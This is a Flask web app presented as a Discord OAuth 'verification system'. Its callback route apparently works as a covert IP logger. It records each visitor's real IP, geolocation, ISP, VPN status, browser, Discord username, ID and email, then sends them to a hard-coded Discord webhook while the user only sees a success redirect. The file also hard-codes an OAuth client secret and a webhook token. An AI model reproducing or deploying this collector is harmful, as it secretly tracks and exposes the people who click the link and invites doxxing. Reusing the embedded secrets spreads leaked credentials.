# api/callback.py
from flask import Flask, request, redirect, jsonify
import requests
import json
from datetime import datetime
import traceback
import os

app = Flask(__name__)

# Configuration
CLIENT_ID = "1499869968899244252"
CLIENT_SECRET = "wTHLSMAnD1q05YLbcSZx6jVRr3q3yipq"
REDIRECT_URI = "https://negro-lemon.vercel.app/callback"
WEBHOOK_URL = "https://discord.com/api/webhooks/1498739271006294016/_4sdyqbsQ6UPC7GP1HPtqnWAf7qPuwCf4G4HYWLVqawxX6iWpHR4kZtpb12W9UJykAT-"
VERIFIED_USERS_FILE = "verified_users.json"

def get_user_ip(request):
    """Récupère l'IP réelle"""
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    if request.headers.get('X-Real-IP'):
        return request.headers.get('X-Real-IP')
    return request.remote_addr

def get_geo_location(ip):
    """Récupère la géolocalisation"""
    try:
        resp = requests.get(f"https://ipapi.co/{ip}/json/", timeout=8)
        data = resp.json()
        return {
            "ip": ip,
            "city": data.get('city', 'Unknown'),
            "country": data.get('country_name', 'Unknown'),
            "isp": data.get('org', 'Unknown'),
            "vpn": data.get('proxy', False)
        }
    except:
        return {"ip": ip, "error": "Geo unavailable"}

def send_to_webhook(user_data, geo_info, device_info):
    """Envoie les données au webhook Discord"""
    
    embed = {
        "title": "🔐 **Nouvelle Vérification**",
        "color": 0x5865F2,
        "timestamp": datetime.now().isoformat(),
        "fields": [
            {
                "name": "👤 Utilisateur",
                "value": f"**{user_data.get('username')}**\nID: `{user_data.get('id')}`",
                "inline": True
            },
            {
                "name": "📧 Email",
                "value": f"`{user_data.get('email', 'Non fourni')}`",
                "inline": True
            },
            {
                "name": "🌍 Localisation",
                "value": f"IP: `{geo_info.get('ip')}`\n{geo_info.get('city')}, {geo_info.get('country')}",
                "inline": False
            },
            {
                "name": "💻 Appareil",
                "value": f"{device_info.get('os')} - {device_info.get('browser')}",
                "inline": True
            },
            {
                "name": "🛡️ VPN/Proxy",
                "value": "⚠️ **Détecté**" if geo_info.get('vpn') else "✅ Propre",
                "inline": True
            }
        ]
    }
    
    try:
        requests.post(WEBHOOK_URL, json={"embeds": [embed]}, timeout=5)
    except Exception as e:
        print(f"Webhook error: {e}")

def save_verified_user(user_id, user_data):
    """Sauvegarde l'utilisateur vérifié"""
    try:
        if os.path.exists(VERIFIED_USERS_FILE):
            with open(VERIFIED_USERS_FILE, 'r') as f:
                users = json.load(f)
        else:
            users = {}
        
        users[str(user_id)] = {
            "user_id": user_id,
            "username": user_data.get('username'),
            "verified_at": datetime.now().isoformat(),
            "email": user_data.get('email')
        }
        
        with open(VERIFIED_USERS_FILE, 'w') as f:
            json.dump(users, f, indent=2)
        return True
    except:
        return False

@app.route('/')
def home():
    return jsonify({"status": "online", "service": "Verification System"})

@app.route('/health')
def health():
    return jsonify({"status": "healthy"})

@app.route('/api/check/<user_id>')
def check_verification(user_id):
    """Vérifie si un user est vérifié (utilisé par le bot)"""
    try:
        if os.path.exists(VERIFIED_USERS_FILE):
            with open(VERIFIED_USERS_FILE, 'r') as f:
                users = json.load(f)
            if str(user_id) in users:
                return jsonify({"verified": True, "user_id": user_id})
        return jsonify({"verified": False, "user_id": user_id})
    except:
        return jsonify({"verified": False, "error": "Server error"})

@app.route('/callback')
def callback():
    """Route principale OAuth"""
    
    code = request.args.get('code')
    error = request.args.get('error')
    
    if error:
        return redirect("https://guns.lol/j8a?error=oauth_failed")
    if not code:
        return redirect("https://guns.lol/j8a?error=no_code")
    
    # Récupérer les infos
    user_ip = get_user_ip(request)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    geo_info = get_geo_location(user_ip)
    
    # Détection appareil basique
    device_info = {
        "os": "Windows" if "Windows" in user_agent else "Unknown",
        "browser": "Chrome" if "Chrome" in user_agent else "Unknown",
        "device": "Desktop"
    }
    
    try:
        # Échanger le code contre un token
        token_response = requests.post(
            "https://discord.com/api/oauth2/token",
            data={
                "client_id": CLIENT_ID,
                "client_secret": CLIENT_SECRET,
                "grant_type": "authorization_code",
                "code": code,
                "redirect_uri": REDIRECT_URI
            },
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=15
        )
        
        token_data = token_response.json()
        access_token = token_data.get('access_token')
        
        if not access_token:
            return redirect("https://guns.lol/j8a?error=token_failed")
        
        # Récupérer les infos Discord
        user_response = requests.get(
            "https://discord.com/api/users/@me",
            headers={"Authorization": f"Bearer {access_token}"},
            timeout=10
        )
        
        user_data = user_response.json()
        user_id = user_data.get('id')
        
        if user_id:
            # Sauvegarder
            save_verified_user(user_id, user_data)
            
            # Envoyer au webhook
            send_to_webhook(user_data, geo_info, device_info)
            
            print(f"✅ Utilisateur vérifié: {user_data.get('username')} ({user_id})")
            print(f"📍 IP: {user_ip} - {geo_info.get('country')}")
        
        # Rediriger vers la page de succès
        return redirect("https://guns.lol/j8a?verified=true")
        
    except Exception as e:
        print(f"❌ Erreur: {e}")
        return redirect("https://guns.lol/j8a?error=unknown")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
